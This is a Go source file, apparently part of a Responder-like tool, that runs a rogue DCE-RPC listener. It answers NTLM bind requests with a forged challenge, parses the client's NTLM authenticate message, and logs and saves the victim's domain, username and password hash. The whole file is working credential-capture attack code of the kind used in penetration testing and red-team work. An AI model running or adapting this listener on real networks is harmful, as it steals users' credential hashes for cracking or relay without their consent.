package server

import (
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"time"

	"go-responder/internal/core"
)

const (
	rpcPTYPEBind    = 0x0b
	rpcPTYPEBindAck = 0x0c
	rpcPTYPEAuth3   = 0x10
	rpcPTYPERequest = 0x00
	rpcPTYPEFault   = 0x03
	rpcAuthNTLM     = 0x0a
)

func ServeDCERPC(ifaceIP net.IP, port int) {
	addr := fmt.Sprintf("%s:%d", ifaceIP, port)
	ln, err := net.Listen("tcp4", addr)
	if err != nil {
		core.LogError("DCE-RPC listen %s - %v", addr, err)
		return
	}
	core.LogInfo("DCE-RPC listening on %s:%d", ifaceIP, port)
	for {
		c, err := ln.Accept()
		if err != nil {
			continue
		}
		go HandleDCERPC(c)
	}
}

func HandleDCERPC(c net.Conn) {
	defer c.Close()
	c.SetDeadline(time.Now().Add(30 * time.Second))

	challenge := core.GetChallenge()
	var authContextID uint32

	for {
		hdr := make([]byte, 16)
		if _, err := io.ReadFull(c, hdr); err != nil {
			return
		}
		fragLen := binary.LittleEndian.Uint16(hdr[8:10])
		authLen := binary.LittleEndian.Uint16(hdr[10:12])
		callID := binary.LittleEndian.Uint32(hdr[12:16])
		ptype := hdr[2]

		bodyLen := int(fragLen) - 16
		if bodyLen < 0 || bodyLen > 1<<20 {
			return
		}
		body := make([]byte, bodyLen)
		if _, err := io.ReadFull(c, body); err != nil {
			return
		}

		if int(authLen) > len(body) {
			return
		}

		switch ptype {
		case rpcPTYPEBind:
			if authLen == 0 {
				c.Write(buildDCERPCBindAck(callID, nil))
				continue
			}
			authVerifOff := len(body) - int(authLen) - 8
			if authVerifOff < 0 {
				return
			}
			av := body[authVerifOff:]
			if len(av) < 8 {
				return
			}
			authType := av[0]
			authContextID = binary.LittleEndian.Uint32(av[4:8])
			authValue := av[8:]

			if authType != rpcAuthNTLM {
				return
			}
			ntlm := core.FindNTLMSSP(authValue)
			if len(ntlm) < 12 {
				return
			}
			if binary.LittleEndian.Uint32(ntlm[8:12]) != 1 {
				return
			}
			core.LogVerbose("DCE-RPC NTLM Type1 from %s", c.RemoteAddr())
			ntlmChallenge := core.BuildNTLMChallenge(challenge, core.SessionDomain, core.SessionMachineName)
			c.Write(buildDCERPCBindAck(callID, buildDCERPCAuthVerif(authType, authContextID, ntlmChallenge)))

		case rpcPTYPEAuth3:
			if len(body) < 12 || authLen == 0 {
				return
			}
			authVerifOff := len(body) - int(authLen) - 8
			if authVerifOff < 0 {
				return
			}
			av := body[authVerifOff:]
			if len(av) < 8 {
				return
			}
			authValue := av[8:]
			ntlm := core.FindNTLMSSP(authValue)
			if len(ntlm) < 12 {
				return
			}
			if binary.LittleEndian.Uint32(ntlm[8:12]) != 3 {
				return
			}
			hash, user, domain, ntlmVer, err := core.ParseNTLMAuthenticate(ntlm, challenge)
			if err != nil {
				core.LogVerbose("DCE-RPC NTLM parse: %v", err)
				return
			}
			core.LogSuccess("[DCE-RPC] %s captured from %s", ntlmVer, c.RemoteAddr())
			core.LogSuccess("          %s\\%s", domain, user)
			core.LogSuccess("          %s", hash)
			core.SaveHash(hash)
			return

		case rpcPTYPERequest:
			c.Write(buildDCERPCFault(callID))
			return
		}
	}
}

func buildDCERPCHeader(ptype byte, fragLen, authLen uint16, callID uint32) []byte {
	h := make([]byte, 16)
	h[0] = 0x05
	h[1] = 0x00
	h[2] = ptype
	h[3] = 0x03
	h[4] = 0x10
	binary.LittleEndian.PutUint16(h[8:10], fragLen)
	binary.LittleEndian.PutUint16(h[10:12], authLen)
	binary.LittleEndian.PutUint32(h[12:16], callID)
	return h
}

func buildDCERPCAuthVerif(authType byte, contextID uint32, authValue []byte) []byte {
	av := make([]byte, 8+len(authValue))
	av[0] = authType
	av[1] = 0x02
	av[2] = 0x00
	av[3] = 0x00
	binary.LittleEndian.PutUint32(av[4:8], contextID)
	copy(av[8:], authValue)
	return av
}

func buildDCERPCBindAck(callID uint32, authVerif []byte) []byte {
	portStr := []byte{'1', '3', '5', 0x00}
	var body []byte
	body = append(body, 0xb8, 0x10)
	body = append(body, 0xb8, 0x10)
	body = append(body, 0x00, 0x00, 0x00, 0x00)

	secAddr := make([]byte, 2+len(portStr))
	binary.LittleEndian.PutUint16(secAddr, uint16(len(portStr)))
	copy(secAddr[2:], portStr)
	body = append(body, secAddr...)

	for len(body)%4 != 0 {
		body = append(body, 0x00)
	}

	body = append(body,
		0x01, 0x00,
		0x00, 0x00,
		0x00, 0x00,
		0x00, 0x00,
		0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11,
		0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60,
		0x02, 0x00, 0x00, 0x00,
	)

	authLen := uint16(0)
	if authVerif != nil {
		authLen = uint16(len(authVerif))
	}
	fragLen := uint16(16 + len(body) + len(authVerif))
	hdr := buildDCERPCHeader(rpcPTYPEBindAck, fragLen, authLen, callID)

	out := append(hdr, body...)
	if authVerif != nil {
		out = append(out, authVerif...)
	}
	return out
}

func buildDCERPCFault(callID uint32) []byte {
	body := make([]byte, 8)
	binary.LittleEndian.PutUint32(body[4:], 0x1c010002)
	hdr := buildDCERPCHeader(rpcPTYPEFault, uint16(16+len(body)), 0, callID)
	return append(hdr, body...)
}
